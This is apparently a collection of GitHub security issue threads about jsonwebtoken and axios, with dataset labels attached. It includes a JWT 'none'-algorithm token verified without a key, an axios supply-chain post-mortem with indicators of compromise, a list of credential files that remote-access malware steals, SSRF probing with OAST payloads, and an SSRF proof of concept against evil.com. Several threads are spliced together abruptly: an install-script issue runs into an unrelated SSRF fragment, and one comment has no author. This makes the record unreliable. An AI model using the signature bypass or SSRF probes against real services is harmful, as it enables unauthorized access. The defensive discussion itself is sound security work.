Verify's `algorithm` option default value is derived from the `secretOrPublicKey` argument value and it never defaults to accepting **all algorithms**. The accidental acceptance of `none` tokens is **also prevented**.

What lead you this expectation of accepting everything?

comments.author: daniel-j-h
comments.body:
Here is an example of what I mean. Create a token with algorithm none

```js
> jwt.sign({ user: 42 }, undefined, { algorithm: 'none' });
'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjo0MiwiaWF0IjoxNTkzNDM2NTEyfQ.'
```

The key is not needed - I set it to undefined.

By default now we can verify that token without having to explicitly allow none as an algorithm

```js
> jwt.verify('eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjo0MiwiaWF0IjoxNTkzNDM2NTEyfQ.')
{ user: 42, iat: 1593436512 }
```

and also works in this scenario when we accidentally pass undefined (or anything else false-y as an argument)

```js
> jwt.verify('eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjo0MiwiaWF0IjoxNTkzNDM2NTEyfQ.', process.env.MYKEY) // oops env var undefined
{ user: 42, iat: 1593436512 }
```

It would be best if we could make this explicit - the user should pass `algorithms: ["none"]` if the user really knows what this means and implies.

This is the case for all algorithm options. By default sign sets `HS256` as an algorithm but in verify by default we accept all algorithms e.g. we also accept a token signed with `HS512`.

comments.author: panva
comments.body:
> but instead accepts all algorithms

so, this is not true.

For the `none` being explicitly required as algorithms option we already have #711 as duplicate.

For the rest, accepting HS512 when you, by default, sign with HS256 isn't that big of a deal. However, we think that in general defaulting to use HS256 even when a private key value is passed in is a problem in itself and will be changing that for next major too, so that the algorithm is derived of the `secretOrPrivateKey` argument same as for verify today.

`jwt.sign` is for signing a token, not encrypting it. With signing, you use a private key to sign a message so that a consumer of the message can use a public key (or the private key, depending if you chose a symmetric algorithm to sign the payload) to verify its authenticity.

For more information; check out [this document](https://auth0.com/docs/tokens/references/jwt-structure). 
Also, [this RFC](https://tools.ietf.org/html/rfc7519) specifies the JSON web token standard, as well as what some JWT claims are used for.

Hope this helps!

comments.author: jhiner
comments.body: To add to @yacineMTB 's response, you can decode a token without verifying its signature. This is why you see this behavior with jwt.io. This distinction is referenced in the readme here: https://github.com/auth0/node-jsonwebtoken#jwtdecodetoken--options

comments.author: panva
comments.body:
@ssatyamchauhan to sign its payload. So that when you receive the token you can verify it was not tampered with. This uses JWS (JSON Web Signatures) to provide integrity protection, NOT CONFIDENTIALITY.

For confidentiality various JWE (JSON Web Encryption) schemes are available, not in this package tho.

comments.author: jhiner
comments.body: Also, in jwt.io, if you provide your secret under the `VERIFY SIGNATURE` section, you will see `Signature Verified`. Without that, you will see `Invalid Signature`.

comments.author: ssatyamchauhan
comments.body: @panva It means there is no way to encrypt the payload? Only the signature is used to verify that the sender of the JWT is who it says it is and to ensure that the message wasn't changed along the way.

comments.author: panva
comments.body:
`jsonwebtoken` does not provide encryption, only signatures.

https://github.com/panva/jose can be used for both signing and encryption, but please consider reading up on the topic and specifications first before jumping in and choosing a cipher suite poorly for your use case.

human_note: This is a user misunderstanding of JWT design (signed vs encrypted tokens), could be a security vulnerability or security-relevant behavior in the library if handled incorrectly and incorporated in a token-based authentication app

title: Add option to ignore signature validation (e. g. for dev/test purposes)
security_topic: ignoring JWT signature verification for testing
qa_summary: The developer wanted to know if they could safely ignore JWT signature verification for testing, and the maintainer answered concretely by linking to the verify.js source at commit a6235fa561b5c30884c97ea0b30c3db3b546ae2c where the option could be added.

comments.author: rockebee
comments.body:
### Describe the problem you'd like to have solved

> In dev and test environments it may be feasible to work with a test JWT token which has no valid signature, e. g. for cases where the token provider can not be modified to create tokens in a manner how a relying party needs it for a special edge situation. In this case the JWT payload could be modified manually be the developer to match/test the requirement, but the current jsonwebtoken implementation does not allow to use this invalid token within ```jwt.verify()``` function.

### Describe the ideal solution

> Adding a new option ```ignoreSignature``` to the existing set of options (like ```ignoreExpiration``` and ```ignoreNotBefore```) would allow developers to use self-modified tokens for tests but still having checks for proper ```issuer```, ```subject```, ```audience``` in place.

## Alternatives and current work-arounds

> Using of ```jwt.decode()``` instead of ```jwt.verify()``` helps in at least getting the JWT decoded properly, but as mentioned above does not allow for getting other verification checks run (```issuer``` etc.)

### Additional context

> no additional input here

comments.author: rockebee
comments.body:
One more note: From looking into source code it should be easy to get implemented by modifying ```verify.js``` somewhere around here: https://github.com/auth0/node-jsonwebtoken/blob/a6235fa561b5c30884c97ea0b30c3db3b546ae2c/verify.js#L126-L134

If you are interested, I could try to prepare a PR for this.

comments.author: ziluvatar
comments.body:
I think it is too risky to add that option to the `verify()` function, without signature the rest of checks do not make sense, you can not trust the information you got. Also I think they key point is here:
> for a special edge situation

I'd say to try to solve that special edge case by fixing the interoperability between both.

Other possible workarounds:
* You could mock the Token Provider depending on your tests.
* You can build an abstraction using `.decode()` as you said in testing, really... any other check without signature verification can be forced to fail whenever you want.
  * Even that abstraction could do `decode()` + `sign()` another token with same payload and `none` algorithm or use one secret for testing an use one of `HS` algorithms + `verify()`.

Anyway whatever you do it has the risk to end up running in production due to a misconfiguration. 😅 

PS: Nice way to present your request 👏

# Backport Request: SSRF Vulnerability (CVE-2025-62718) to 0.x branch

## Description

A Server-Side Request Forgery (SSRF) vulnerability has been identified in axios, assigned CVE-2025-62718. This vulnerability has been fixed in the 1.x branch but is still present in the 0.x branch, which is still widely used.

## Request

I kindly request consideration for backporting the fix for this vulnerability to the 0.x branch to ensure the security of users still relying on this version.

## Rationale

1. Security: SSRF vulnerabilities can lead to severe security issues, allowing attackers to make unauthorized requests from the server.
2. Legacy Version Support: Many projects still use the 0.x branch and may not be ready to upgrade to 1.x for various reasons.
3. Security Compliance: Backporting this fix will help projects using 0.x meet security requirements.

## Additional Information

- CVE: CVE-2025-62718
- Fixed in branch: 1.15.0
- Backport needed to: 0.x

Thank you for considering this request. If any additional information or assistance is needed in the backporting process, please let me know.

title: Post Mortem: axios npm supply chain compromise
security_topic: determining if a project is impacted by malicious npm versions and remediation steps
qa_summary: Developers needed concrete remediation steps for the compromised axios@1.14.1 and 0.30.4 releases, and the issue provides exact grep commands, downgrade instructions, secret rotation guidance, and links to external advisories (StepSecurity blog, Snyk advisory, Socket analysis) as concrete anchors.

comments.author: jasonsaayman
comments.body:
# Post Mortem: axios npm supply chain compromise

**Date:** March 31, 2026
**Author:** Jason Saayman
**Status:** Remediation in progress

On March 31, 2026, two malicious versions of axios (1.14.1 and 0.30.4) were published to the npm registry through my compromised account. Both versions injected a dependency called `plain-crypto-js@4.2.1` that installed a remote access trojan on macOS, Windows, and Linux.

The malicious versions were live for about 3 hours before being removed.

## Are you affected?

Check your lockfile:
```bash
grep -E "axios@(1\.14\.1|0\.30\.4)|plain-crypto-js" package-lock.json yarn.lock 2>/dev/null
```
If anything comes back, treat that machine as compromised:
1. Downgrade to `axios@1.14.0` (or `0.30.3` for 0.x users)
2. Delete `node_modules/plain-crypto-js/`
3. Rotate every secret, token, and credential on that machine
4. Check your network logs for connections to `sfrclak[.]com` or `142.11.206.73` on port 8000
5. If this happened on a CI runner, rotate any secrets that were injected during the affected build

If you were already pinned to a clean version and didn't run a fresh install between 00:21 and 03:15 UTC on March 31, you're fine.

For detailed remediation guidance, including CI/CD-specific steps, see:
- [StepSecurity: full technical analysis and remediation](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan)
- [Snyk: advisory and scanning guidance](https://snyk.io/blog/axios-npm-package-compromised-supply-chain-attack-delivers-cross-platform/)
- [Socket: Supply Chain Attack on Axios Pulls Malicious Dependency from npm](https://socket.dev/blog/axios-npm-package-compromised)

## What happened

The attacker gained access to the lead maintainer's PC through a targeted social engineering campaign and RAT malware. This gave them access to the npm account credentials, which they used to publish the malicious versions.

The attack followed patterns documented in similar campaigns targeting open source maintainers.

## Resolution

Complete wipe of all lead maintainer devices as well as resetting of all credentials. This includes all accounts irrespective of platform, both personal and all other capacities.

## What's changing

To prevent this from happening again, these are the changes being made:

| Action | Type |
| --- | --- |
| Reset of all devices and credentials | Prevention |
| Immutable release setup | Prevention |
| Proper adoption of OIDC flow for publishing | Prevention |
| Improvement of overall security posture | Prevention |
| Updating of all GitHub actions to adopt best practices | Prevention |

This list is not the end. We will continue actively working on improving security beyond these items.

## Attack Timeline

I don't have an exact timeline for when the initial compromise occurred, but this is the sequence of events for the package itself:
- About 2 weeks before March 31: social engineering campaign initiated against the lead maintainer
- March 30, 05:57 UTC: `plain-crypto-js@4.2.0` published to npm
- March 31, 00:21 UTC: `axios@1.14.1` published with `plain-crypto-js@4.2.1` injected
- March 31, around 01:00 UTC: `axios@0.30.4` published with the same payload
- March 31, around 01:00 UTC: first external detections
- March 31, around 01:00 UTC: community members file issues reporting the compromise. The attacker deletes them using the compromised account.
- March 31, 01:38 UTC: axios collaborator DigitalBrainJS opens PR #10591 to deprecate the compromised versions, flags the deleted issues to the community, and contacts npm directly
- March 31, 03:15 UTC: malicious versions removed from npm
- March 31, 03:29 UTC: `plain-crypto-js` removed from npm

For detailed technical timelines:
- [StepSecurity: forensic timeline](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan)
- [Datadog Security Labs: full attack flow and response analysis](https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/)


## Lessons learned

We are actively investigating how unauthorized access was obtained and reviewing all aspects of our security posture and access controls. While we do not have confirmed details to share at this time, this incident reinforces the need for continuous monitoring, strong account protections, and vigilance across both project infrastructure and individual maintainer environments.

We will continue to strengthen our practices in alignment with industry best practices and in collaboration with groups such as the OpenJS Security Working Group.

Security posture should be continuously monitored and improved. Specifically from this incident:

- Publishing directly from a personal account was a risk that could have been avoided. The OIDC flow and immutable release setup we are now adopting should have been in place before this happened.
- There was no automated way to detect an unauthorized publish. Detection depended entirely on the community noticing.
- Open source maintainers with high-impact packages are active targets for sophisticated social engineering. Hyper vigilance is needed both on the registry and in a personal capacity.


## Summary for broarder audience

We can confirm that two compromised versions of Axios were briefly made available through a widely used software download system due to unauthorized access to the lead maintainer's account, not a change to the underlying code.

We are working with the companies that operate this system, along with security experts, to investigate and contain the issue. Organizations that installed these versions should remove them immediately and treat affected systems as potentially compromised, including rotating any sensitive credentials.

This was the result of a compromised lead maintainer's account, and we are actively investigating how access was obtained. We do not have confirmed details to share at this time.


## Acknowledgments

Thanks to @DigitalBrainJS for acting fast when the compromised account had higher permissions than his own and for getting npm to take action. Thanks to Open Source Community and the npm security team for their fast response.

The malicious versions have been removed from npm and are no longer infecting users. The immediate incident is resolved. We are actively working on the security improvements listed above to prevent this from happening again.

I'll update this as the investigation progresses. Questions welcome in this thread.

comments.author: feross
comments.body:
Thanks for the thorough post-mortem, Jason. Writing one of these is never easy, and the transparency here is exactly what the ecosystem needs.

A few things worth highlighting for others reading this:

The response was fast. ~3 hours from publish to removal is a good outcome given the constraints. @DigitalBrainJS in particular deserves recognition for acting decisively.

For maintainers of high-download packages, this incident reinforces a few things we'd recommend:

1. OIDC-based publishing (provenance attestation) is the single highest-leverage change you can make. It removes long-lived credentials from the equation entirely. Glad to see this is on the roadmap.
2. Publish from CI, not from a local machine. If a maintainer's laptop is compromised, the blast radius shouldn't include the ability to push a release.
3. Enable npm's mandatory 2FA for publish, and use a hardware key if possible. TOTP on a compromised machine is not 2FA.

We detected the malicious `axios@1.14.1` and `axios@0.30.4` versions within minutes of publication and blocked it for users with the [AI Detected Potential Malware](https://socket.dev/alerts/gptMalware) alert enabled. Thanks for sharing our [analysis](https://socket.dev/blog/axios-npm-package-compromised). 

This kind of targeted social engineering against individual maintainers is the new normal. It's not a reflection on Jason or the axios team -- these campaigns are sophisticated and persistent. We're seeing them across the ecosystem and they're only accelerating.

Wishing you and the team the best as you work through the remaining security work here. The npm ecosystem is better for having maintainers who respond like this.

thanks for the write up @jasonsaayman 👏

beyond the advise listed, worth highlighting for folks: 

- `npx` invocations produce a non-deterministic depedncy resolution at run-time, no package-lock trace. (even if you're not using `@latest`)
- if your using `npx` in your CI / MCP with a package that directly or indirectly uses axios with semver range that could have resolved to `v1.14.1` / `v.0.30.4` during the ~3 hour window, you have likely downloaded `plain-crypto-js`
  - sadly, most CI & MCP tooling setup docs, always advise to simply run: `npx <package>@latest`
- check the network logs in your CI during those times. 
- `npx` call hardening with pre-install + lock file generation + using `--no --offline`
  - full technical details here: https://socket.dev/blog/hidden-blast-radius-of-the-axios-compromise

comments.author: shaanmajid
comments.body:
@feross

>OIDC-based publishing (provenance attestation) is the single highest-leverage change you can make. It removes long-lived credentials from the equation entirely. Glad to see this is on the roadmap.
Publish from CI, not from a local machine. If a maintainer's laptop is compromised, the blast radius shouldn't include the ability to push a release.
Enable npm's mandatory 2FA for publish, and use a hardware key if possible. TOTP on a compromised machine is not 2FA.

Worth noting that Axios was already following most of these recommendations, and it still wasn't enough to prevent this compromise.

The v1.x publish workflow has had provenance since 2023. The last four legitimate v1 releases (1.13.4 through 1.14.0) all went through GitHub Actions with Trusted Publishing. You can verify this via the [registry data](https://registry.npmjs.org/axios): each was published with Trusted Publishing and provenance attestations. The malicious v1.14.1 has neither. I have a brief summary of the registry evidence [here](https://gist.github.com/shaanmajid/fa1bb71f063476f3e8fa726f54fd2d37). (There was a stray `NODE_AUTH_TOKEN` in the v1 publish workflow at the time of compromise, removed in #10619, but it wasn't doing anything for the last few releases; OIDC was correctly set up and the OIDC token was overriding it.)

(v0.x never had a CI publish workflow and was always published locally. That wasn't great, but it also isn't why the compromise happened. The attacker had RAT access and published directly to the registry, bypassing CI entirely.)

@jasonsaayman confirmed elsewhere that he had 2FA enabled on all accounts, including GitHub and npm.

I'd still recommend all projects use Trusted Publishing and attestations, but that alone clearly wasn't enough here. The core problem is this part of your reply (emphasis mine):

> Publish from CI, not from a local machine. **If a maintainer's laptop is compromised, the blast radius shouldn't include the ability to push a release.**

As things stand, **nothing** on npmjs can be configured to enforce this. The strictest package-level setting npm offers maintainers in their package publication settings -- "Require two-factor authentication and disallow tokens (recommended)" -- does not block local `npm publish`. It opens a  browser window for 2FA, but with a RAT on the machine and software-based TOTP, that's trivial to circumvent (as you noted). There is no npmjs setting to require OIDC-only publishing, unlike some other registries, e.g., crates.io.

I commend Axios's commitment towards improving their supply-chain security -- all projects have gaps, and it requires constant vigilance to resolve them -- but I think the only mitigation on Axios's end that could have actually prevented this would have been using hardware FIDO2 keys for maintainer's npm auth, which can't be hijacked by a RAT.

The bigger gaps are elsewhere IMO:
- npmjs (and other registries) should allow packages to opt in to OIDC-only publishing rejecting all non-OIDC publishes at the registry level.
- [Dependency cooldown periods](https://blog.yossarian.net/2025/11/21/We-should-all-be-using-dependency-cooldowns): the malicious versions were live for ~3 hours. A mere 3-day cooldown would never have pulled them. Dependabot, Renovate, uv, and bun all support `minimumReleaseAge` or   equivalent.
- Consumers and tooling should verify attestations: every legitimate v1 release had OIDC provenance; the malicious one didn't. Any tool checking for this would have flagged it instantly. But provenance verification is opt-in, and practically nobody does it today.

There are dozens and dozens of modules they can drop on you from here. Yes, specifically YOU bc YOU have a UUID associated all the stuff they take off your device. Sometimes they will take accounts of folks who go to a lot of conferences and meet a lot of people, even if they aren't rich. [Fortune wrote about this today in fact.](https://fortune.com/2026/04/02/north-korea-dprk-zoom-phishing-social-engineering-attack-telegram/?jongun) They do this bc it will increase the likelihood of them getting a rich victim next time. comments.author: DanielRuf
comments.body:
@aeneasr please provide rules for YARA or Sigma. These are the default tools to scan for IOCs.

@tayvano I have nothing to add. You are right and I'm getting warnings about these threat actors for a very long time.

The only thing I want to add: please always put secrets in some secure password / secrets vault with a very strong passphrase. Don't trust people you don't know. And use separate devices / laptops for different tasks (meeting vs work). I know people who got hacked just because they had only one device for everything.

Not going to suggest building some scenarios with MITRE ATT&CK, but please apply some defense in depth and zero-trust or human-in-the-loop solutions.

In the Trivy and LiteLLM cases I recommended for example Shamirs Secret Sharing or in general splitting secrets between multiple persons. Sure, that won't help much when only one person works on the project. But most secrets just wait there to be taken and nothing prevents that when some malware exfiltrates the content of your home folder. Secrets can always be sharded (even offline) or moved to some hardware key for a very long time (Windows for example had the boot disks as a first defense against maiden attacks, but this is a different story).

Not sure if I will build some solution, but plaintext secret sharding can be done offline with a very simple and cheap solution: nfc chips (as stickers) that you can place in different rooms and scanned in the right order give you the full secret.

Not going to name specific free / paid solutions for secrets vaults, but you can always seal them in a separate location and with a minimum number of shards - one per relevant person. This is already done in practice for money vaults and other very critical things (rockets for example too). A single compromised user / device should not lead to full takeover.

Edit: I always recommend blameless post mortems and I'm a strong proponent of sharing lessons learned, working on solutions together.

If there is some interest to create some Security WG, I can help with that @jasonsaayman (https://github.com/nodejs/security-wg?tab=readme-ov-file#emeritus-members, https://github.com/BerriAI/litellm-security-wg). I'm open to provide any help you need, people like @tayvano have probably a great overview and understanding of such threats and how defenders have to adapt to it.

comments.author: DanielRuf
comments.body:
@SerJaimeLannister well, social engineering like in offline red teaming scenarios is basically testing, how much you trust other random people.

Technical solutions can help only partly, and do not always prevent all damages.

I can probably name more cases from work. But as @tayvano made clear, professional threat actors like nationstate actors quickly adapt their strategy. This is more about how you think when you are under pressure or alone. The xz incident was planned much longer and they gained the trust of the sole maintainer there.

Package cooldown settings, OIDC and more only cover specific things. But without any package vetting happening for new releases on npmjs, there is not much trust. We had a time with GPG where the web of trust was important. And npmjs had used GPG signatures in the background. We would need something like that for registries. If @feross and other trusted parties sign with their GPG key, that a release would be "ok", you can safely install it. But GPG was never meant to scale that much and npm was never designed for this. Not saying WOT is useless. But maintainers fail, what is left to stop you from installing a new release? Do you take a look at https://app.unpkg.com/axios@1.14.0 or some other solution, before you actually download something? Do you remember to set `ignore-scripts` on new devices?

My proposal is to gather people who can push security of the whole developer ecosystem. Otherwise these will be always isolated cases and the next incident with a different package with no or less security measures (technical & organizational) will hit people again.

As you can see there, it's not that easy when you count all possible techniques and tactics with social engineering / phishing mentioned:
https://attack.mitre.org/techniques/enterprise/
https://attack.mitre.org/matrices/enterprise/

There are good reasons, why deno (from the Nodejs creator) strictly requires you to provide the allowed permissions (like network, I/O, ...). Most developers will still have most credentials in one place / environment and as long as insecure defaults like `ignore-scripts` or long-lived tokens are there, those who are not aware of the risks will still fall victim. And qubesos would not be an option for those (also most do not want to and can not change their OS or install extra software). So either registries or tool providers (npm, npmjs, GitHub) or maintainers have to work on the solutions, that protect everyone by default.

comments.author: tayvano
comments.body:
**Regarding 2FA questions that keep coming up...**

2FA protects the login step—the initial authentication. 2FA is important—mandatory imo. Because it protects against your username/password being leaked and a lot of phishing.

But how it works is that once you are authenticated, the platforms issue a session token/cookie which is stored on your device or in your browser and is used for future authentication. If you think about it, it's obvious. You don't have to 2FA every time you make a call to npm or github. This is why.

When you have a RAT on your device, it grabs your post-authentication state, making 2FA irrelevant.

Here's some places we know they exfiltrate:

- `.aws`
- `.azure`
- `.bit/config`
- `.cargo/credentials`
- `.circleci/cli.yml`
- `.config/configstore/firebase-tools.json`
- `.config/doctl/config.yaml`
- `.config/gcloud`
- `.config/gh`
- `.config/glab-cli`
- `.config/linode-cli`
- `.config/stripe/config.toml`
- `.gem/credentials`
- `.netfily`
- `.netrc`
- `.npmrc` (long-lived bearer token)
- `.nuget/NuGet.Config`
- `.oci`
- `.pulumi/credentials.json`
- `.pypirc`
- `.twilio-cli`
- `.vault-token`
- `.vercel`
- `.wrangler/config`
- `.yarnrc.yml`
- your entire keychain
- all your password managers and everything inside
- all your browser storage, cookies, autofills, passwords, and history

Issuing short and long lived authentication tokens is standard operating procedure for every single platform and product you use. It's why you don't have to login and enter MFA every time you click a link, make a call, etc. The information to authenticate lives on your device.

This obviously becomes a problem when the attackers have a backdoor to your device and why 2FA will not protect you in this situation.

comments.author: DigitalBrainJS
comments.body:
If npm had a cool-down period during which it publishes a version that can only be installed manually using a special tag, support for one-time kill switch tokens (in our context, we'd call them quarantine tokens) with the optional publish webhook, such attacks would be almost impossible, even if a group of North Korean hackers were sitting at the PC of an npm package admin. 
In addition to manual activation of the token by one of the maintainers in case something bad happened, they could also add an external watcher with an algorithmic and possibly AI analyzer, and such an attack would be nipped in the bud. 
Nothing bad would happen in case of false-positive token activation, due to which maintainers won't be able to publish new versions, and users will not be able to install the very latest versions for a couple of days, but very bad things happen when maintainers lose control of a package, even for a few hours.
In this particular attack, we lost 40-50 minutes because there was no way to block the packet distribution ourselves.

comments.author: Jeremitc
comments.body:
> I've started a discussion for npm to add password/2FA confirmation for sensitive changes like email, token creation etc
> 
> https://github.com/orgs/community/discussions/191503
> 
> Right now, as long as you're logged in to npm, an attacker can do anything, which is pretty bad.

Absolutely agree. The recent Axios incident (#10636) highlights exactly why this is a critical missing piece in NPM's security architecture. The reliance purely on an active session cookie without an escalation challenge for sensitive actions is an unacceptable risk given the modern threat landscape, where AI-assisted social engineering, fake interviews, and infostealers are extremely common.

To actually help prevent these supply chain attacks moving forward, NPM desperately needs a Sudo Mode (similar to what GitHub already implements natively).

I suggest the community pushes for the following features to be implemented:

Strict Re-Authentication Challenge: Require re-entering a password, 2FA code, or WebAuthn/Passkey confirmation specifically for sensitive actions:
Creating, modifying or deleting Automation/Access Tokens.
Adding or removing package maintainers/owners.
Changing the primary email or security settings.
Session Isolation: Just because someone stole an active session cookie to browse logged in, doesn't mean they should have the authority to publish code or create tokens without passing a physical hardware check (like a YubiKey or Passkey) in that exact moment.
We need to support this request aggressively. A successful phishing attack on a single developer should never be enough to automatically compromise millions of machines downstream. It's time for NPM to upgrade their session management logic!

comments.author: ekreloff

Thanks @ashstrc — that approach sounds good! A couple of specific things to include:

1. **Protocol check**: The example should verify the redirect stays on HTTPS before re-injecting credentials. Something like `if (new URL(redirectUrl).protocol === 'https:')` before setting the auth header.

title: DeprecationWarning: url.parse() used in proxy resolution → Node DEP0169
security_topic: migration from deprecated url.parse() in Axios proxy handling
qa_summary: The developer asked whether the DEP0169 security‑related deprecation warning from url.parse() can be resolved, and the answer points to the fix merged in Axios PR #7499 (https://github.com/axios/axios/pull/7499).

comments.author: vamsee9
comments.body:
DeprecationWarning: `url.parse()` used during Axios proxy resolution in Node (DEP0169)

When using Axios v1.13.2 in a Node/SSR environment, Axios triggers Node’s deprecation warning for `url.parse()`:

```
(node:XXXX) [DEP0169] DeprecationWarning: `url.parse()` behavior is not standardized and prone to errors that have security implications. Use the WHATWG URL API instead.
```

The stack trace consistently points to Axios’ internal proxy resolution path:

```
at urlParse (node:url:136:13)
at Object.getProxyForUrl (node_modules/proxy-from-env/index.js:…)
at setProxy (node_modules/axios/lib/…)
at dispatchHttpRequest (...)
```

This happens whenever Axios runs in Node with proxy support enabled (via HTTP_PROXY / HTTPS_PROXY / NO_PROXY env vars or Axios proxy configuration). The `proxy-from-env` package used internally still depends on `url.parse()`, which Node has deprecated under DEP0169.

Reproduction:

* Node.js v18+ or v20+
* Axios v1.13.2
* Any SSR environment (Next.js, Express, server functions)
* Proxy environment variables set, or Axios configured with `proxy: true`
* Execute any Axios request; Node logs DEP0169

Impact:

* Logs are polluted with deprecation warnings in SSR workloads
* `url.parse()` is flagged for removal in future Node versions
* Continued dependency on deprecated URL parsing introduces compliance and security concerns
* No configuration currently exists to disable proxy resolution or switch Axios to WHATWG URL internally

Expected:

* Axios should use WHATWG `URL` instead of `url.parse()` inside proxy resolution
* Proxy detection should avoid deprecated APIs
* No DEP0169 warnings in modern Node runtimes

Suggested fix:

* Replace `url.parse()` usage inside Axios’ proxy path with `new URL()`
* Update or wrap `proxy-from-env` with a WHATWG-safe implementation
* Provide a configuration flag such as `proxyResolve: false` or `disableProxyEnv: true` to bypass the proxy resolver entirely

Additional context:

* Warning originates from Node’s DEP0169 (WHATWG URL migration)
* SSR frameworks such as Next.js surface this prominently during server rendering
* This issue is reproducible in clean Node environments with Axios alone

Please review and advise whether this deprecation migration is planned, or if a proxy-layer abstraction is being refactored to use the WHATWG URL API.

title: remove prepare script using husky and deprecated husky set from npm package

comments.author: bahag-Rothm
comments.body:
### Describe the bug

Hi Axios contributors,

While installing axios@1.9.0 as a transitive dependency in a monorepo, I’m encountering this error:
```
npm error .git can't be found
npm error > axios@1.9.0 prepare:hooks
npm error > npx husky set .husky/commit-msg "npx commitlint --edit $1"
npm error husky - install command is DEPRECATED
```

This appears to be caused by a prepare script in package.json that looks like this:
`"scripts": {
  "prepare": "husky install && npm run prepare:hooks",

	•	It assumes a .git directory exists (which is not always true in monorepos or CI)
	•	It uses deprecated Husky commands (install, set)
	•	It runs developer-only tooling during install


Please consider removing the prepare script from the published package and move hook setup to a local-only husky:init script for contributors, e.g.:

`"scripts": {
  "husky:init": "npx husky install && npx husky set .husky/commit-msg 'npx commitlint --edit $1'"
}`

1. go into a monorepo
2. install a package that wants axios 1.9.0 as  a resolution or dependencie

```js
see above
```

should install as a transitive dependency in a monorepo

`const query = new URLSearchParams({
  pageURL: user_input,
  ref: external_link,
  ...
});

fetch(`/previews/s?${query}`, { method: "POST" });
`

The concern is that URL() constructor is being fed dynamic input, potentially allowing crafted URLs like http://attacker@internal.service  a classic case where SSRF can occur even without axios.create because redirect logic or follow-redirects gets invoked implicitly.
The presence of new URL("https://a@b"), .username, .password, and URLSearchParams logic implies that full absolute URLs could be constructed and sent to fetch() or wrapped into Request().
I attempted exploitation using OAST payloads via /previews/<x>/ping?ref=... and /previews/s?ref=..., but no callbacks yet. Still, this looks dangerously close to an SSRF vector, just obfuscated under a framework abstraction.

Can someone confirm:
Does this qualify as a reachable vector under the Axios advisory (since it leverages similar behavior)?
Could this still be vulnerable even without explicit use of axios.create()?
Has anyone reproduced exploitation using just new URL() + fetch() with tainted input?
Thanks in advance  trying to confirm whether this bundle warrants a report or is just a dead-end pattern.

title: Axios ignoring allowAbsoluteUrls configuration parameter
security_topic: allowAbsoluteUrls configuration ignored leading to absolute URL request vulnerability
qa_summary: The developer needed to know if the `allowAbsoluteUrls` setting blocks absolute‑URL requests (preventing a potential SSRF issue) and the fix is provided in PR #6814 (https://github.com/axios/axios/pull/6814) which adds the flag to `buildFullPath`.

comments.author: david-arien
comments.body:
### Describe the bug

Starting from Axios v1.8.0, the `allowAbsoluteUrls` attribute was introduced in the configuration to control the use of absolute URLs. (PR: https://github.com/axios/axios/pull/6795)

Currently, this parameter is being ignored in the `buildFullPath` call from the HTTP adapter.

https://github.com/axios/axios/blob/72acf759373ef4e211d5299818d19e50e08c02f8/lib/adapters/http.js#L231

This oversight means that it is still possible to make requests to absolute URLs even when the `allowAbsoluteUrls` configuration attribute is set to `false`.

### Proof of Concept:

Even though `getUri` returns a URL from `example.com`, the request is sent to `evil.com`

```javascript
> const axios = require('axios');
> axios.VERSION
'1.8.1'
> const client = axios.create({baseURL: 'http://example.com/', allowAbsoluteUrls: false});
> client.getUri({url: 'http://evil.com'});
'http://example.com/http://evil.com'
> client.get('http://evil.com');
```

### Solution:

Include the `allowAbsoluteUrls` parameter in the call to the `buildFullPath` function.

https://github.com/axios/axios/blob/72acf759373ef4e211d5299818d19e50e08c02f8/lib/adapters/http.js#L231

```javascript
const fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);
```

### To Reproduce

_No response_

### Code snippet

```js
const axios = require('axios');
const client = axios.create({baseURL: 'http://example.com/', allowAbsoluteUrls: false});
client.get('http://evil.com');
```

### Expected behavior

The request should be to example.com

1.8.0

http
